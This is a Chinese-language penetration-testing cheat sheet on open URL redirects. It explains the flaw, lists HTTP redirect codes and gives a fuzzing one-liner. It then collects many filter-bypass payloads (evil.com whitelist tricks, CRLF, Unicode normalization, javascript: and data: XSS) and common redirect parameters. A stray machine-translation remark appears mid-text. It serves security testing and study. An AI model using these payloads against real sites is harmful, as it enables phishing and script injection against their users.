# 开放URL重定向

> 当一个Web应用程序接受不受信任的输入，可能导致该Web应用程序将请求重定向到包含在不受信任输入中的URL时，可能会出现未经验证的重定向和转发。通过修改不受信任的URL输入到一个恶意站点，攻击者可能成功发起网络钓鱼诈骗并窃取用户凭据。因为修改后的链接中的服务器名称与原始站点相同，所以网络钓鱼尝试可能看起来更可信。未经验证的重定向和转发攻击也可以用来恶意构造一个URL，该URL会通过应用程序的访问控制检查，然后将攻击者转发到他们通常无法访问的特权功能。

## 摘要

* [实验室](#labs)
* [利用](#exploitation)
  * [HTTP重定向状态码](#http-redirection-status-code)
  * [模糊测试](#fuzzing)
  * [绕过过滤器](#filter-bypass)
  * [常见注入参数](#common-injection-parameters)
* [参考资料](#references)


## 实验室

* [Root Me - HTTP - 开放重定向](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - 基于DOM的开放重定向](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)


## 利用

当一个Web应用程序或服务器使用未经验证的用户提供的输入来将用户重定向到其他站点时，就会出现开放重定向漏洞。这可以允许攻击者制作一个指向易受攻击站点的链接，该链接重定向到他们选择的恶意站点。

攻击者可以利用此漏洞进行网络钓鱼活动、会话盗窃或强迫用户在未经同意的情况下执行操作。

考虑以下示例：
您的Web应用程序具有一个功能，允许用户点击链接并自动重定向到保存的首选主页。这可能是这样实现的：

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

攻击者可以通过将`userpreferredsite.com`替换为指向恶意网站的链接，在这里利用开放重定向。然后他们可以在网络钓鱼电子邮件中或在另一个网站上分发这个链接。当用户点击链接时，他们被带到恶意网站。


## HTTP重定向状态码

HTTP重定向状态码，即以3开头的状态码，表示客户端必须采取额外操作来完成请求。以下是一些最常见的状态码：

- [300多重选择](https://httpstatuses.com/300) - 这表明请求有多个可能的响应。客户端应选择其中之一。
- [301永久移动](https://httpstatuses.com/301) - 这意味着所请求的资源已永久移动到Location头部给出的URL。所有未来的请求应使用新的URI。
- [302找到](https://httpstatuses.com/302) - 此响应代码意味着所请求的资源已暂时移动到Location头部给出的URL。与301不同，它并不意味着资源已被永久移动，只是暂时位于其他地方。
- [303查看其他](https://httpstatuses.com/303) - 服务器发送此响应以指导客户端使用GET请求在另一个URI获取所请求的资源。
- [304未修改](https://httpstatuses.com/304) - 这用于缓存目的。它告诉客户端响应未被修改，因此客户端可以继续使用相同的缓存版本响应。
- [305使用代理](https://httpstatuses.com/305) - 所请求的资源必须通过Location头部提供的代理访问。
- [307临时重定向](https://httpstatuses.com/307) - 这意味着所请求的资源已暂时移动到Location头部给出的URL，并且未来请求仍应使用原始URI。
- [308永久重定向](https://httpstatuses.com/308) - 这意味着资源已永久移动到Location头部给出的URL，并且未来请求应使用新URI。它与301类似，但不允许改变HTTP方法。


## 模糊测试

从*Open-Redirect-payloads.txt*中替换`www.whitelisteddomain.tld`为测试用例中特定的白名单域名

要完成此操作，只需将`WHITELISTEDDOMAIN`的值`www.test.com`修改为测试用例URL。

```powershell
WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
```

## 绕过过滤器

使用白名单域名或关键词

```powershell
www.whitelisted.com.evil.com 重定向到 evil.com
```

使用CRLF绕过"javascript"黑名单关键词

```powershell
java%0d%0ascript%0d%0a:alert(0)
```

使用"//" & "////"绕过"http"黑名单关键词

```powershell
//google.com
////google.com
```



根据您提供的文档内容，以下是对应的翻译：

使用 "https:" 来绕过被黑名单的 "//" 关键词

```powershell
https:google.com
```

使用 "\/\/" 来绕过被黑名单的 "//" 关键词（浏览器将 \/\/ 视为 //）

```powershell
\/\/google.com/
/\/google.com/
```

使用 "%E3%80%82" 来绕过被黑名单的 "." 字符

```powershell
/?redir=google。com
//google%E3%80%82com
```

使用空字节 "%00" 来绕过黑名单过滤

```powershell
//google%00.com
```

使用参数污染

```powershell
?next=whitelisted.com&next=google.com
```

使用 "@" 字符，浏览器会将 "@" 后的任何内容重定向

```powershell
http://www.theirsite.com@yoursite.com/
```

创建文件夹作为他们的域名

```powershell
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

使用 "?" 字符，浏览器会将其转换为 "/?"

```powershell
http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com
```


主机/拆分 Unicode 规范化
```powershell
https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
http://a.com／X.b.com
```

来自开放URL的XSS - 如果它在JS变量中

```powershell
";alert(0);//
```

来自 data:// 包装器的XSS

```powershell
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

来自 javascript:// 包装器的XSS

```powershell
http://www.example.com/redirect.php?url=javascript:prompt(1)
```


## 常见注入参数

```powershell
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```


## 参考资料

- **Open-Redirect-Payloads**：
  - 作者/来源：cujanovic（[链接](https://github.com/cujanovic/Open-Redirect-Payloads)）
  - 内容概述：该资源可能提供了关于开放重定向漏洞的利用有效载荷的信息。

- **Host/Split Exploitable Antipatterns in Unicode Normalization**：
  - 发表会议：BlackHat US 2019（[链接](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)）
  - 内容概述：这份文档讨论了在Unicode规范化过程中存在的可被利用的主机/分割反模式。

- **Open Redirect Vulnerability**：
  - 作者/来源：s0cket7（发表日期：2018年8月15日）（[链接](https://s0cket7.com/open-redirect-vulnerability/)）
  - 内容概述：这篇文章可能探讨了开放重定向漏洞的相关信息。

- **OWASP - Unvalidated Redirects and Forwards Cheat Sheet**：
  - 来源：开放式Web应用程序安全项目（OWASP）（[链接](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)）
  - 内容概述：这是OWASP提供的一份关于未经验证的重定向和转发的简明指南。

- **Pentester Land - Open Redirect Cheat Sheet**：
  - 来源：Pentester Land（发表日期：2018年11月2日）（[链接](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)）
  - 内容概述：这份简明指南提供了关于开放重定向漏洞利用的信息。

- **You do not need to run 80 reconnaissance tools to get access to user accounts**：
  - 作者/来源：@stefanocoding（[链接](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)）
  - 内容概述：这篇文章讨论了获取用户账户访问权限时，不需要运行大量侦察工具的方法。

